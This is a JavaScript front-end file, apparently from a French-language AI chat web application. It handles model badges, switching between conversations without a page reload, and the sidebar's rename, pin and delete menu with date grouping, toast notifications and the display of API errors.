    const rawText = content.dataset?.raw || '';
    actions.innerHTML = buildAssistantActionsHtml(rawText);
    actions.dataset.imageOnly = isImageOnlyText(rawText) ? '1' : '0';
}

/**
 * Injecte le badge LLM (provider + modèle [+ crédits]) sous la bulle assistant.
 * `messageEl` = élément `.message` racine. Idempotent : remplace badge existant.
 * `badge` = payload renvoyé par le backend dans l'événement SSE `done`.
 * `credits` = nombre de crédits consommés par cette réponse (>0 pour afficher).
 */
function applyLlmBadge(messageEl, badge, credits = 0, responseMs = null) {
    if (!messageEl || !badge || !badge.provider) return;
    const body = messageEl.querySelector('.msg-body');
    if (!body) return;
    const existing = body.querySelector('.msg-llm-badge');
    if (existing) existing.remove();

    const provLabel = String(badge.provider_label || badge.provider || '');
    const modelLabel = String(badge.model_label || badge.model || '');
    const tooltip = provLabel + (modelLabel ? ' · ' + modelLabel : '');
    const text = modelLabel || provLabel;

    const el = document.createElement('div');
    el.className = 'msg-llm-badge';
    el.title = tooltip;
    if (badge.provider_logo) {
        const img = document.createElement('img');
        img.src = badge.provider_logo;
        img.alt = provLabel;
        img.className = 'msg-llm-badge-logo';
        img.width = 16;
        img.height = 16;
        img.style.cssText = 'width:16px;height:16px;flex:0 0 16px;border-radius:50%;object-fit:contain';
        el.appendChild(img);
    }
    const span = document.createElement('span');
    span.className = 'msg-llm-badge-text';
    span.textContent = text;
    el.appendChild(span);

    const creditsN = Math.max(0, Number(credits) || 0);
    const creditsSpan = document.createElement('span');
    creditsSpan.className = 'msg-llm-badge-credits';
    creditsSpan.title = t('Crédits consommés par cette réponse');
    creditsSpan.innerHTML = '· ' + creditsN.toLocaleString('fr-FR') + t(' crédits');
    if (creditsN <= 0) creditsSpan.hidden = true;
    el.appendChild(creditsSpan);

    const msN = Math.max(0, Number(responseMs) || 0);
    const timeSpan = document.createElement('span');
    timeSpan.className = 'msg-llm-badge-time';
    timeSpan.title = t('Temps de génération de la réponse');
    timeSpan.innerHTML = '· ' + (msN / 1000).toLocaleString('fr-FR', { minimumFractionDigits: 1, maximumFractionDigits: 1 }) + ' s';
    if (msN <= 0) timeSpan.hidden = true;
    el.appendChild(timeSpan);

    // Insérer avant les boutons d'action si présents, sinon en fin de body
    const actions = body.querySelector('.msg-actions');
    if (actions) body.insertBefore(el, actions);
    else body.appendChild(el);
}

/** Met à jour uniquement la partie crédits du badge d'un message (sans toucher au reste). */
function updateLlmBadgeCredits(messageEl, credits) {
    if (!messageEl) return;
    const span = messageEl.querySelector('.msg-llm-badge .msg-llm-badge-credits');
    if (!span) return;
    const creditsN = Math.max(0, Number(credits) || 0);
    span.innerHTML = '· ' + creditsN.toLocaleString('fr-FR') + t(' crédits');
    span.hidden = creditsN <= 0;
}

// =========================================================
// NAVIGATION SPA ENTRE CONVERSATIONS
// =========================================================

/**
 * Change de conversation sans recharger la page.
 * Le stream en cours continue en arrière-plan.
 */
async function switchConversation(targetId) {
    if (!await ensureSessionActive()) return;

    const targetStr = String(targetId);
    if (targetStr === String(visibleConvId)) return;

    visibleConvId = targetStr;
    closeHtmlViewer();
    closeVideoViewer();
    closeSourcesViewer();
    closeDeckViewer();
    // Une conversation vocale est attachée au fil qu'elle écoute : en changer
    // la termine (la réponse en cours, elle, continue côté serveur).
    window.stopVoiceChat?.();
    history.pushState({ convId: targetStr }, '', `/chat/${targetStr}`);

    // Mise à jour de la sidebar
    document.querySelectorAll('.conv-item').forEach(a => {
        a.classList.toggle('active', String(a.dataset.id) === targetStr);
    });
    // Nouveau résultat d'une tâche programmée : lu en l'ouvrant (le serveur
    // l'enregistre dans /chat/{id}/json).
    document.querySelectorAll(`.conv-item[data-id="${targetStr}"].is-unread`).forEach(a => {
        a.classList.remove('is-unread');
        a.querySelector('.conv-unread-dot')?.remove();
    });

    // Mise à jour du convId caché et du bouton
    document.getElementById('convId').value = targetStr;
    sendBtn.disabled = true;
    document.querySelector('.chat-main')?.classList.remove('is-home');
    window.MiaComposerHints?.setSuggestion?.(null);

    // Affichage d'un indicateur de chargement
    const chatMsgsEl = document.getElementById('chatMessages');
    chatMsgsEl.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:200px;gap:10px;color:var(--text-muted)"><svg style="animation:spin 1s linear infinite" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>Chargement…</div>';

    try {
        const res = await fetchWithSessionGuard(`/chat/${targetStr}/json`, {
            headers: { 'X-CSRF-Token': csrfToken }
        });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        if (!data.ok) throw new Error(t('Erreur serveur'));

        // Mise à jour de la valeur LLM (pour envoi de messages)
        const llmInput = document.getElementById('llmSelect');
        if (llmInput) llmInput.value = data.conversation.llm_used || '';
        const llmKey = llmInput?.value || '';
        const pickerBtn = document.getElementById('llmPickerBtn');
        const pickerItem = document.querySelector(`#llmPickerList .llm-picker-item[data-value="${llmKey.replace(/\\/g,'\\\\').replace(/"/g,'\\"')}"]`);
        if (pickerBtn && pickerItem) {
            const icon = pickerBtn.querySelector('img');
            const label = pickerBtn.querySelector('span');
            if (icon) icon.src = pickerItem.dataset.logo || '';
            if (label) label.textContent = pickerItem.dataset.label || llmKey;
            document.querySelectorAll('#llmPickerList .llm-picker-item').forEach(i => i.classList.remove('active'));
            pickerItem.classList.add('active');
        }
        updateLlmInfoBar(llmInput?.value || '');
        updateTopToolbarMeta({
            modelLabel: pickerItem?.dataset?.label || llmKey,
            modelCost: pickerItem?.dataset?.cost || 0,
            modelCostTitle: pickerItem?.dataset?.costTitle || '',
            modelLogo: pickerItem?.dataset?.logo || '',
            historyCount: Array.isArray(data.messages) ? data.messages.length : 0,
        });
        applyConversationCreditsTotal(data.conversation_credits_total || 0);

        // Mise à jour du titre de page
        document.title = data.conversation.title || t('Conversation');

        // Avatar d'assistant pour les messages : TOUJOURS celui de la
        // conversation visible ('' si aucun profil → logo par défaut).
        window.ACTIVE_PROFILE_AVATAR = data.profile?.avatar || '';

        // Identité de l'assistant : elle vit dans le composer (rangée haute de
        // la pilule), la toolbar est masquée en mode assistant par le CSS
        // (.has-assistant) — cf. CLAUDE.md « Identité de l'assistant dans le composer ».
        const toolbarSels   = document.getElementById('toolbarSelectors');
        const llmInlineWrap = document.getElementById('llmInlinePickerWrap');
        const llmPickerList = document.getElementById('llmPickerList');
        const profileSelEl  = document.getElementById('profileSelect');
        if (data.profile) {
            if (profileSelEl) profileSelEl.innerHTML =
                `<option value="${escAttr(String(data.profile.id))}" data-color="${escAttr(data.profile.color||'')}" data-avatar="${escAttr(data.profile.avatar||'')}" selected>${escHtml(data.profile.name||'Assistant')}</option>`;
            // Modèle affiché = default_llm COURANT de l'assistant (ce que send()
            // utilise réellement), pas le llm_used figé à la création.
            const identityLlmKey = (data.profile.default_llm && window.LLM_INFO?.[data.profile.default_llm])
                ? data.profile.default_llm : llmKey;
            renderAssistantIdentity(data.profile, {
                llmKey:    identityLlmKey,
                llmInfo:   window.LLM_INFO?.[identityLlmKey],
                tools:     Array.isArray(data.profile.tools) ? data.profile.tools : [],
                kbs:       Array.isArray(data.knowledge_bases?.profile) ? data.knowledge_bases.profile : [],
                canManage: !!data.profile_can_manage,
            });
            if (toolbarSels)   toolbarSels.style.display   = 'none';
            if (llmInlineWrap) llmInlineWrap.style.display = 'none';
            if (llmPickerList) llmPickerList.style.display = 'none';
        } else {
            if (profileSelEl) profileSelEl.innerHTML = '';
            renderAssistantIdentity(null);
            if (toolbarSels)   toolbarSels.style.display   = '';
            if (llmInlineWrap) llmInlineWrap.style.display = '';
        }
        applyProfileColor(data.profile?.color || '');

        // Rendu des messages
        chatMsgsEl.innerHTML = '';
        document.getElementById('chatToolbar')?.style.setProperty('display', '');
        // Conversation d'assistant encore vide : sa présentation occupe l'espace
        // (même rendu que le serveur ; appendMessage la retire au 1er message).
        if (data.profile && !(Array.isArray(data.messages) && data.messages.length)) {
            chatMsgsEl.innerHTML = buildAssistantWelcomeHtml(data.profile);
        }
        // Conversation née d'une tâche programmée : bandeau en tête du fil.
        if (data.scheduled_task) {
            chatMsgsEl.insertAdjacentHTML('afterbegin', buildScheduledBannerHtml(data.scheduled_task));
        }

        for (const msg of data.messages) {
            const files = (msg.files || []).map(f => ({
                name: f.name,
                type: f.type,
                previewUrl: null, // Pas de base64 dans la réponse JSON (performance)
            }));
            appendMessage(msg.role, msg.content, files, false, { messageId: msg.id, llmBadge: msg.llm_badge || null, creditsUsed: Number(msg.credits_used ?? 0), responseMs: Number(msg.response_ms ?? 0), actions: msg.actions || null, plan: msg.plan || null, suite: msg.suite || null, suggestion: typeof msg.suggestion === 'string' ? msg.suggestion : null });
        }
        // Cartes d'approbation encore en attente dans cette conversation.
        renderPendingDriveActions(Array.isArray(data.pending_actions) ? data.pending_actions : []);
        syncContinueButton();

        // Si cette conv a un stream actif, on rattache un élément DOM
        const stream = activeStreams.get(targetStr);
        if (stream && !stream.done) {
            const newEl = appendMessage('assistant', stream.rawText, [], true);
            stream.el = newEl;
            // Actions déjà tracées pendant que la conv était masquée → pile
            // rétablie, avec le plan et la note d'avancement en cours.
            if (stream.plan) renderPlanCard(newEl.closest('.msg-body'), stream.plan);
            if ((Array.isArray(stream.actions) && stream.actions.length) || (Array.isArray(stream.running) && stream.running.length)) {
                renderActionTrace(newEl.closest('.msg-body'), stream.actions || [], stream.running || []);
            }
            if (stream.progress) renderProgressNote(newEl.closest('.msg-body'), stream.progress);
            // Erreur déjà reçue pendant que la conv était masquée → bloc d'erreur.
            if (stream.hadError && stream.errorPayload) {
                renderInlineError(newEl, stream.errorPayload);
            } else if (stream.rawText) {
                // Rétablir la phase courante (ou cacher le bandeau si des chunks sont déjà arrivés)
                newEl.querySelector('.stream-phase')?.remove();
            } else if (stream.currentPhase) {
                updateStreamPhase(newEl, stream.currentPhase);
            }
            sendBtn.disabled = true;
        } else {
            sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
        }

        // Générations asynchrones encore en cours sur cette conversation : le
        // flux n'a jamais été coupé, seul l'affichage est à reconstruire.
        restoreJobPlaceholders(targetStr);
        refreshSendStopUi();

        // Outil engagé sur cette conversation → pastille rétablie.
        syncToolForConversation();

        // Bases de connaissances de la conversation affichée : sélection ET
        // lignes verrouillées de son assistant (elles changent avec lui). La
        // charge est déjà dans la réponse, aucune requête supplémentaire.
        window.syncKbForConversation?.(data.knowledge_bases);

        // Brouillon laissé sur CETTE conversation → restauré (champ vide seulement).
        restoreComposerDraft();

        scrollBottom(true);

    } catch (err) {
        if (err instanceof Error && err.message === 'SESSION_EXPIRED') return;
        chatMsgsEl.innerHTML = '<p style="padding:2rem;text-align:center;color:var(--text-muted)">Impossible de charger la conversation.</p>';
        sendBtn.disabled = msgInput.value.trim() === '' && pendingFiles.length === 0;
    }
}

/** Ajoute une conv créée via AJAX dans la sidebar (sans rechargement). */
function addConvToSidebar(id, title, llm) {
    const list = document.getElementById('convList');
    if (!list) return;
    // Retire le message "Aucune conversation" s'il est présent
    list.querySelector('.conv-empty')?.remove();
    // Désactive les items actifs existants
    list.querySelectorAll('.conv-item.active').forEach(a => a.classList.remove('active'));
    const a = document.createElement('a');
    a.href = `/chat/${id}`;
    a.className = 'conv-item active';
    a.dataset.id = String(id);
    a.dataset.pinned = '0';
    a.dataset.ts = String(Math.floor(Date.now() / 1000));
    a.innerHTML = `<span class="conv-title">${escHtml(title)}</span>`
                + `<button type="button" class="conv-menu-btn" data-conv-menu data-id="${id}" aria-label="Actions" aria-haspopup="true" aria-expanded="false">`
                +   '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="5" cy="12" r="1.7"/><circle cx="12" cy="12" r="1.7"/><circle cx="19" cy="12" r="1.7"/></svg>'
                + '</button>';
    list.prepend(a);
    regroupConvList(list);
}

/** Met à jour le titre d'une conversation dans la sidebar (et `<title>` si active). */
function applyConversationTitle(cid, title) {
    if (!cid || !title) return;
    document.querySelectorAll(`.conv-item[data-id="${cid}"] .conv-title`).forEach(el => {
        el.textContent = title;
    });
    if (String(cid) === String(convId())) {
        document.title = title;
    }
}

/**
 * Affiche un toast de notification. `opts.title` : une cause nommée en tête
 * (« Crédit épuisé chez OpenAI »), le message dessous — un tel toast reste
 * plus longtemps (on lit deux lignes, pas une) et ne part pas tant que le
 * pointeur est dessus.
 */
function showToast(message, type = 'info', opts = {}) {
    let container = document.getElementById('toastContainer');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toastContainer';
        container.style.cssText = 'position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:8px;z-index:9999';
        document.body.appendChild(container);
    }
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    const title = opts && opts.title ? String(opts.title) : '';
    if (title) {
        toast.classList.add('toast-titled');
        toast.setAttribute('role', 'alert');
        const strong = document.createElement('strong');
        strong.className = 'toast-title';
        strong.textContent = title;
        const text = document.createElement('span');
        text.className = 'toast-text';
        text.textContent = message;
        toast.append(strong, text);
    } else {
        toast.textContent = message;
    }
    container.appendChild(toast);
    setTimeout(() => toast.classList.add('toast-visible'), 10);
    const duration = (opts && opts.duration) || (title ? 9000 : 4000);
    let timer = null;
    const leave = () => {
        toast.classList.remove('toast-visible');
        setTimeout(() => toast.remove(), 300);
    };
    const arm = () => { clearTimeout(timer); timer = setTimeout(leave, duration); };
    toast.addEventListener('mouseenter', () => clearTimeout(timer));
    toast.addEventListener('mouseleave', arm);
    arm();
}

/**
 * Panne d'une session vocale vue par le NAVIGATEUR seul (dictée : canal direct
 * avec OpenAI) — retrouvée par son code ou son statut, présentée avec les
 * mots du serveur (window.LLM_ERROR_OPENAI). Null : rien de reconnu.
 */
function openAiSessionError(code, status) {
    const table = window.LLM_ERROR_OPENAI || {};
    const c = String(code || '');
    let kind = null;
    if (/insufficient_quota|billing|quota/i.test(c) || status === 402) kind = 'quota';
    else if (/invalid_api_key|authentication|unauthorized|expired/i.test(c) || status === 401) kind = 'auth';
    else if (/permission|forbidden|unsupported_country/i.test(c) || status === 403) kind = 'permission';
    else if (/rate_limit/i.test(c) || status === 429) kind = 'rate_limit';
    else if (/overloaded|capacity/i.test(c)) kind = 'overloaded';
    else if (/server_error|internal/i.test(c) || status >= 500) kind = 'server';
    return kind && table[kind] ? table[kind] : null;
}

/**
 * Toast d'une panne présentée par le serveur (charge utile `llm_error` :
 * titre + message lisibles). `prefix` dit ce qui n'a pas pu se faire
 * (« Dictée impossible »). Repli sur le texte seul sans charge utile.
 */
function showLlmErrorToast(payload, fallbackMessage, prefix = '') {
    const p = payload && typeof payload === 'object' ? payload : null;
    if (!p || !p.message) {
        showToast(prefix ? prefix + ' : ' + fallbackMessage : fallbackMessage, 'error');
        return;
    }
    const title = String(p.title || '');
    const type = ['rate_limit', 'overloaded', 'server', 'network', 'timeout', 'empty', 'generic'].includes(p.kind) ? 'error' : 'warning';
    showToast(String(p.message), type, { title: prefix ? (title ? prefix + ' — ' + title : prefix) : (title || t('Une erreur est survenue')) });
}

// =========================================================
// MENU CONTEXTUEL CONVERSATION (Renommer / Épingler / Supprimer)
// =========================================================
const PIN_ICON_SVG = '<svg class="conv-pin-icon" width="11" height="13" viewBox="0 0 384 512" fill="currentColor" aria-hidden="true"><path d="M32 32C32 14.3 46.3 0 64 0L320 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-29.5 0 10.3 134.1c37.1 21.2 65.8 56.4 78.2 99.7l3.8 13.4c2.8 9.7 .8 20-5.2 28.1S362 352 352 352L32 352c-10 0-19.5-4.7-25.5-12.7s-8-18.4-5.2-28.1L5 297.8c12.4-43.3 41-78.5 78.2-99.7L93.5 64 64 64C46.3 64 32 49.7 32 32zM160 400l64 0 0 112c0 17.7-14.3 32-32 32s-32-14.3-32-32l0-112z"/></svg>';

const convMenu = document.getElementById('convMenu');
let convMenuTargetId = null;        // id de la conversation visée par le menu
let convMenuTargetEl  = null;       // référence à l'élément .conv-item correspondant

function closeConvMenu() {
    if (!convMenu || convMenu.hidden) return;
    convMenu.hidden = true;
    document.querySelectorAll('.conv-menu-btn[aria-expanded="true"]').forEach(b => b.setAttribute('aria-expanded', 'false'));
    convMenuTargetId = null;
    convMenuTargetEl = null;
}

function openConvMenu(btn) {
    if (!convMenu) return;
    const id   = btn.dataset.id;
    const item = btn.closest('.conv-item');
    if (!id || !item) return;

    convMenuTargetId = id;
    convMenuTargetEl = item;
    const isPinned   = item.dataset.pinned === '1';

    const pinLabel = convMenu.querySelector('[data-pin-label]');
    if (pinLabel) pinLabel.textContent = isPinned ? t('Désépingler') : t('Épingler');

    // Position : sous le bouton, alignée à droite, contrainte au viewport.
    convMenu.hidden = false;
    convMenu.style.visibility = 'hidden';
    // Pixels d'ÉCRAN jusqu'à l'écriture, divisés alors par la taille
    // d'affichage (zoom de <html>, cf. head-meta.php).
    const z       = window.miaUiZoom ? window.miaUiZoom() : 1;
    const btnRect = btn.getBoundingClientRect();
    const menuW   = convMenu.offsetWidth * z;
    const menuH   = convMenu.offsetHeight * z;
    let left = btnRect.right - menuW;
    let top  = btnRect.bottom + 4;
    // Plancher : la zone sûre (barre d'état / encoche) hors navigateur, sinon le
    // rabattement vers le haut place le menu sous l'horloge.
    const minTop = safeAreaTop() + 8;
    if (left < 8) left = 8;
    if (left + menuW > window.innerWidth - 8) left = window.innerWidth - menuW - 8;
    if (top + menuH > window.innerHeight - 8) top = btnRect.top - menuH - 4;
    convMenu.style.left = `${Math.max(8, left) / z}px`;
    convMenu.style.top  = `${Math.max(minTop, top) / z}px`;
    convMenu.style.visibility = '';

    btn.setAttribute('aria-expanded', 'true');
}

// Fermeture sur clic hors / Escape / scroll / resize.
document.addEventListener('click', (e) => {
    if (!convMenu || convMenu.hidden) return;
    if (e.target.closest('#convMenu')) return;
    if (e.target.closest('[data-conv-menu]')) return;
    closeConvMenu();
});
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeConvMenu();
});
window.addEventListener('resize', closeConvMenu);
document.querySelector('.conv-list')?.addEventListener('scroll', closeConvMenu, true);

// MENU COMPTE : ouverture/fermeture/position déplacées dans user-menu.js
// (partagé chat + admin + paramètres). Chargé avant chat.js.

// ---- Renommer : édition inline du titre ----
function startRename(item, id) {
    closeConvMenu();
    const titleEl = item.querySelector('.conv-title');
    if (!titleEl) return;
    const currentTitle = titleEl.textContent || '';
    const input = document.createElement('input');
    input.type        = 'text';
    input.value       = currentTitle;
    input.maxLength   = 200;
    input.className   = 'conv-title-edit';
    input.spellcheck  = false;
    titleEl.replaceWith(input);
    item.classList.add('is-editing');
    input.focus();
    input.select();

    let done = false;
    const restore = (text) => {
        if (done) return;
        done = true;
        const span = document.createElement('span');
        span.className   = 'conv-title';
        span.textContent = text;
        input.replaceWith(span);
        item.classList.remove('is-editing');
    };

    const commit = async () => {
        if (done) return;
        const next = input.value.trim();
        if (next === '' || next === currentTitle) {
            restore(currentTitle);
            return;
        }
        try {
            const fd = new FormData();
            fd.append('title', next);
            const res = await fetch(`/chat/${id}/rename`, {
                method: 'POST',
                headers: { 'X-CSRF-Token': csrfToken, 'Accept': 'application/json' },
                body: fd,
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok || data.error) {
                showToast(data.error || t('Renommage impossible'), 'error');
                restore(currentTitle);
                return;
            }
            restore(data.title || next);
            // Si conversation active : mettre à jour le <title> du document
            if (String(convId()) === String(id)) {
                document.title = data.title || next;
            }
        } catch {
            showToast(t('Renommage impossible'), 'error');
            restore(currentTitle);
        }
    };

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter')   { e.preventDefault(); commit(); }
        if (e.key === 'Escape')  { e.preventDefault(); restore(currentTitle); }
    });
    input.addEventListener('blur', commit);
    // Empêche la navigation SPA quand on clique dans l'input.
    input.addEventListener('click', (e) => { e.preventDefault(); e.stopPropagation(); });
}

// ---- Épingler / Désépingler ----
async function togglePinConv(item, id) {
    closeConvMenu();
    try {
        const res  = await fetch(`/chat/${id}/pin`, {
            method: 'POST',
            headers: { 'X-CSRF-Token': csrfToken, 'Accept': 'application/json' },
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) {
            showToast(data.message || data.error || t('Action impossible'), 'error');
            return;
        }
        // Mise à jour DOM : flag + icône sur TOUTES les copies de la conversation
        // (historique et résultats de recherche), puis l'historique se regroupe
        // (épinglées en tête). L'item n'est plus un enfant direct de la liste :
        // il vit dans son groupe.
        const pinned = !!data.pinned;
        document.querySelectorAll(`.conv-item[data-id="${String(id)}"]`).forEach(el => {
            el.dataset.pinned = pinned ? '1' : '0';
            el.classList.toggle('is-pinned', pinned);
            const existingIcon = el.querySelector('.conv-pin-icon');
            if (pinned && !existingIcon) {
                const colorBar = el.querySelector('.conv-color-bar');
                const tmp = document.createElement('span');
                tmp.innerHTML = PIN_ICON_SVG;
                const iconNode = tmp.firstChild;
                if (colorBar) colorBar.after(iconNode);
                else el.prepend(iconNode);
            } else if (!pinned && existingIcon) {
                existingIcon.remove();
            }
        });
        regroupConvList(document.getElementById('convList'));
    } catch {
        showToast(t('Action impossible'), 'error');
    }
}

// Bucket de date d'une conversation (selon updated_at) → clé + libellé traduit.
function convDateBucket(ts, now) {
    const startOfDay = d => new Date(d.getFullYear(), d.getMonth(), d.getDate()).getTime();
    const day = 86400000;
    const today = startOfDay(now);
    const jour = startOfDay(ts);
    if (jour === today)         return { key: 'today',     label: t('Aujourd’hui') };
    if (jour === today - day)   return { key: 'yesterday', label: t('Hier') };
    if (jour >  today - 7 * day)  return { key: '7d',  label: t('7 derniers jours') };
    if (jour >  today - 30 * day) return { key: '30d', label: t('30 derniers jours') };
    // Mois dans la langue de la page (« Août 2026 », « August 2026 »).
    const lbl = ts.toLocaleDateString(document.documentElement.lang || 'fr', { month: 'long', year: 'numeric' });
    return { key: 'm' + ts.getFullYear() + '-' + ts.getMonth(), label: lbl.charAt(0).toUpperCase() + lbl.slice(1) };
}

// Range la liste en GROUPES : Épinglées en tête, puis les autres par date
// décroissante, une période par groupe (Aujourd'hui, Hier, 7 derniers jours…).
// Chaque groupe est un bloc `.conv-group` portant son libellé : c'est ce qui
// permet d'encadrer « Épinglées » et de prolonger chaque libellé de période
// d'un filet. Rejouable à volonté (ajout, suppression, épinglage) : les items
// sont repris où qu'ils soient, les anciens groupes retirés.
function regroupConvList(list) {
    if (!list) return;
    const items = Array.from(list.querySelectorAll('.conv-item'));
    if (!items.length) {
        list.querySelectorAll('.conv-group, .conv-group-label').forEach(g => g.remove());
        return;
    }

    const pinned = items.filter(i => i.classList.contains('is-pinned'));
    const others = items
        .filter(i => !i.classList.contains('is-pinned'))
        .sort((a, b) => (Number(b.dataset.ts) || 0) - (Number(a.dataset.ts) || 0));

    const now  = new Date();
    const frag = document.createDocumentFragment();
    const openGroup = (key, label) => {
        const group = document.createElement('div');
        group.className = 'conv-group' + (key === 'pinned' ? ' conv-group--pinned' : '');
        group.dataset.group = key;
        group.setAttribute('role', 'group');
        const head = document.createElement('div');
        head.className = 'conv-group-label';
        head.id = 'convGroup-' + key;
        group.setAttribute('aria-labelledby', head.id);
        if (key === 'pinned') head.insertAdjacentHTML('beforeend', PIN_ICON_SVG.replace('class="conv-pin-icon"', 'class="conv-group-pin"'));
        const text = document.createElement('span');
        text.textContent = label;
        head.appendChild(text);
        group.appendChild(head);
        frag.appendChild(group);
        return group;
    };

    if (pinned.length) {
        const group = openGroup('pinned', t('Épinglées'));
        // Nombre sur le plafond (Conversation::MAX_PINNED, posé par le gabarit).
        const max = Number(list.dataset.maxPinned) || 0;
        const count = document.createElement('span');
        count.className = 'conv-group-count';
        count.textContent = max ? `${pinned.length}/${max}` : String(pinned.length);
        group.firstChild.appendChild(count);
        pinned.forEach(i => group.appendChild(i));
    }
    let curKey = null;
    let group  = null;
    others.forEach(item => {
        const ts = new Date((Number(item.dataset.ts) || 0) * 1000);
        const b  = convDateBucket(ts, now);
        if (b.key !== curKey) { group = openGroup(b.key, b.label); curKey = b.key; }
        group.appendChild(item);
    });
    // Les items ont quitté les anciens groupes en rejoignant le fragment.
    list.querySelectorAll('.conv-group, .conv-group-label').forEach(g => g.remove());
    list.appendChild(frag);
}
// Alias rétro-compat (anciens appels).
function reorderConvList(list) { regroupConvList(list); }

// ---- Suppression avec modale de confirmation ----
const deleteModal       = document.getElementById('convDeleteModal');
const deleteModalTitle  = document.getElementById('convDeleteTitle');
const deleteModalOk     = document.getElementById('convDeleteConfirm');
const deleteModalCancel = document.getElementById('convDeleteCancel');
let deleteModalCtx      = null; // { id, item }

function openDeleteModal(item, id) {
    closeConvMenu();
    if (!deleteModal) return;
    deleteModalCtx = { id, item };
    if (deleteModalTitle) {
        deleteModalTitle.textContent = item.querySelector('.conv-title')?.textContent || 'Conversation';
    }
    deleteModal.style.display = 'flex';
    setTimeout(() => deleteModalOk?.focus(), 0);
}
function closeDeleteModal() {
    if (deleteModal) deleteModal.style.display = 'none';
    deleteModalCtx = null;
}
deleteModalCancel?.addEventListener('click', closeDeleteModal);
deleteModal?.addEventListener('click', (e) => { if (e.target === deleteModal) closeDeleteModal(); });
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && deleteModal?.style.display === 'flex') closeDeleteModal();
});
deleteModalOk?.addEventListener('click', async () => {
    if (!deleteModalCtx) return;
    const { id } = deleteModalCtx;
    closeDeleteModal();
    try {
        await fetch(`/chat/${id}/delete`, { method: 'POST', headers: { 'X-CSRF-Token': csrfToken } });
        activeStreams.delete(String(id));
        if (String(convId()) === String(id)) {
            window.location.href = '/';
            return;
        }
        document.querySelectorAll(`.conv-item[data-id="${id}"]`).forEach(el => el.remove());
        regroupConvList(document.getElementById('convList'));
    } catch {
        showToast(t('Suppression impossible'), 'error');
    }
});

// Actions du menu
convMenu?.addEventListener('click', (e) => {
    const action = e.target.closest('[data-action]')?.dataset.action;
    if (!action || !convMenuTargetEl || !convMenuTargetId) return;
    const id   = convMenuTargetId;
    const item = convMenuTargetEl;
    if (action === 'rename') startRename(item, id);
    else if (action === 'pin') togglePinConv(item, id);
    else if (action === 'delete') openDeleteModal(item, id);
});

// =========================================================
// INTERCEPTION DES CLICS SIDEBAR (navigation SPA + menu)
// =========================================================
async function handleConvListClick(e) {
    // ---- Menu 3-points ----
    const menuBtn = e.target.closest('[data-conv-menu]');
    if (menuBtn) {
        e.preventDefault();
        e.stopPropagation();
        const alreadyOpen = menuBtn.getAttribute('aria-expanded') === 'true';
        closeConvMenu();
        if (!alreadyOpen) openConvMenu(menuBtn);
        return;
    }

    // ---- Édition inline en cours : ne pas naviguer ----
    if (e.target.closest('.conv-title-edit')) {
        e.preventDefault();
        return;
    }

    // ---- Navigation SPA ----
    const item = e.target.closest('.conv-item');
    if (!item || !item.dataset.id) return;
    e.preventDefault();
    // Si l'item est en édition (renommage), ne pas naviguer.
    if (item.classList.contains('is-editing')) return;
    switchConversation(item.dataset.id);
}
document.getElementById('convList')?.addEventListener('click', handleConvListClick);
// Regroupe l'historique par dates au chargement initial.
regroupConvList(document.getElementById('convList'));

// La recherche (titres et contenu des conversations, mais aussi pages et
// actions) vit dans la palette « Rechercher ou aller à… » :
// command-palette.js, ouverte par ⌘K / Ctrl+K ou par le bouton du volet.

// Navigation navigateur (boutons précédent / suivant)
window.addEventListener('popstate', e => {
    const match = location.pathname.match(/\/chat\/(\d+)/);
    if (match) {
        switchConversation(match[1]);
    } else {
        window.location.href = '/';
    }
});

// =========================================================
// BLOC D'ERREUR API (rendu propre et élégant en conversation)
// =========================================================

/**
 * Un message assistant est une erreur API si son texte commence par ⚠
 * (préfixe posé par le serveur pour les erreurs LLM/outils image/vidéo/HTML).
 * Permet de re-rendre proprement une erreur au rechargement de la conversation.
 */
function looksLikeErrorMessage(text) {
    return /^\s*⚠/.test(String(text || ''));
}

/**
 * Construit la charge utile d'erreur d'un texte ⚠ persisté.
 *
 * Le serveur écrit « ⚠️ Titre », une ligne vide, puis le message
 * (LlmErrorPresenter::toPlainText) : le titre nomme la cause — « Crédit épuisé
 * chez OpenAI », « Trop de contenu pour ce modèle » — et doit survivre au
 * rechargement. Un seul paragraphe (échec d'une action de connecteur, message
 * écrit avant cette forme) = message seul, sous le titre générique.
 */
function errorPayloadFromText(text) {
    const body = String(text || '').replace(/^\s*⚠️?\s*/, '').trim();
    const parts = body.match(/^([^\n]{1,120})\n\s*\n([\s\S]+)$/);
    if (parts) {
        const title = parts[1].trim();
        const known = knownErrorTitleKind(title);
        return {
            kind: known || 'generic',
            title: title,
            message: parts[2].trim(),
            // Seul un titre du présentateur d'erreurs dit une cause côté
            // fournisseur : l'échec d'une action de connecteur, par exemple,
            // ne se règle pas en prévenant un administrateur.
            contact_admin: known !== null && errorContactKinds().includes(known),
        };
    }
    return {
        kind: 'generic',
        title: t('Une erreur est survenue'),
        message: body || t('Réessayez dans un instant.'),
    };
}

/**
 * Genre d'une erreur relue, d'après son titre. Le genre n'est pas enregistré
 * avec le message ; le serveur fournit la table de ses titres, dans toutes les
 * langues (window.LLM_ERROR_TITLES, les plus longs d'abord). C'est lui qui rend
 * à l'encadré son ton : ambre en direct, il ne doit pas redevenir rouge à la
 * relecture.
 */
function errorKindFromTitle(title) {
    return knownErrorTitleKind(title) || 'generic';
}

/** Genre d'un titre du présentateur d'erreurs, null pour un titre inconnu. */
function knownErrorTitleKind(title) {
    const table = window.LLM_ERROR_TITLES || {};
    for (const prefix of Object.keys(table)) {
        if (String(title).startsWith(prefix)) return table[prefix];
    }
    return null;
}

/** Genres où l'encadré propose de prévenir un administrateur (LlmErrorPresenter::CONTACT_KINDS). */
function errorContactKinds() {
    const actions = window.LLM_ERROR_ACTIONS || {};
